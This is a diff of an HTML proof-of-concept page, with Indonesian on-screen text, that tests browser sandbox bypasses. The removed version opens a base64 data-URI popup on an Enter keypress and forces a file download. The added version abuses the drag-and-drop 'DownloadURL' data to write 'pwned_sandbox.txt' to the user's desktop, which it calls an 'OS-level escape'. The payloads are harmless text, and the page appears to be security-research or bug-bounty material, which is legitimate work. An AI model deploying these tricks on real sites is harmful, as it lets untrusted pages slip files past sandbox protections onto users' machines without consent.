@@ -1,67 +1,69 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <title>PoC - Clean Data-URI Escape</title>
+    <title>PoC - DnD Sandbox Bypass</title>
     <style>
         body {
-            background-color: #ffebee;
+            background-color: #e3f2fd;
             font-family: sans-serif;
-            text-align: center;
-            padding-top: 50px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
 
-        #targetBtn {
-            padding: 15px;
-            cursor: pointer;
-            background: #d32f2f;
+        #dragTarget {
+            width: 250px;
+            height: 150px;
+            background-color: #1976d2;
             color: white;
-            border: none;
-            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            border-radius: 15px;
+            cursor: grab;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            user-select: none;
+        }
+
+        #dragTarget:active {
+            cursor: grabbing;
+        }
+
+        .instruction {
+            margin-top: 20px;
+            color: #333;
         }
     </style>
 </head>
 
 <body>
 
-    <h3>Situs A (Sandboxed)</h3>
-    <button id="targetBtn">1. KLIK DULU</button>
-    <p>2. Lalu tahan <strong>ENTER</strong></p>
+    <h3>Situs A (Drag and Drop Context)</h3>
+
+    <div id="dragTarget" draggable="true">
+        KLIK & SERET SAYA <br> KE DESKTOP / FOLDER
+    </div>
+
+    <p class="instruction">Tarik kotak biru di atas keluar dari browser ke desktop kamu.</p>
 
     <script>
-        const rawPayload = `
-            <html>
-            <body>
-                <h2 style="color:red">Konteks Data URI</h2>
-                <script>
-                    try {
-                        const a = document.createElement("a");
-                        a.href = "data:application/octet-stream;base64,U2FuZGJveCBCeXBhc3MgU3VjY2Vzcw==";
-                        a.download = "data_uri_bypass.txt";
-                        document.body.appendChild(a);
-                        a.click();
-                        console.log("Download dipicu!");
-                    } catch (e) { console.error(e.message); }
-                <\/script>
-            </body>
-            </html>
-        `;
+        const dragTarget = document.getElementById('dragTarget');
 
-        const encodedPayload = btoa(rawPayload);
-
-        window.addEventListener("keydown", (e) => {
-            if (e.key === "Enter") {
-                console.log("Membuka popup via Data-URI...");
-                window.open(
-                    "data:text/html;base64," + encodedPayload,
-                    "_blank",
-                    "width=400,height=300"
-                );
-            }
+        dragTarget.addEventListener('dragstart', (e) => {
+            console.log("Drag started - Attempting OS-level escape...");
+            const fileName = "pwned_sandbox.txt";
+            const fileContent = "data:text/plain;base64,U2FuZGJveCBCeXBhc3MgdmlhIERyYWcgYW5kIERyb3AgaXMgU3VjY2VzcyE=";
+            const downloadData = `text/plain:${fileName}:${fileContent}`;
+            e.dataTransfer.setData("DownloadURL", downloadData);
+            e.dataTransfer.setData("text/plain", "Ini hasil bypass sandbox");
         });
-
-        document.getElementById('targetBtn').focus();
     </script>
 </body>
 
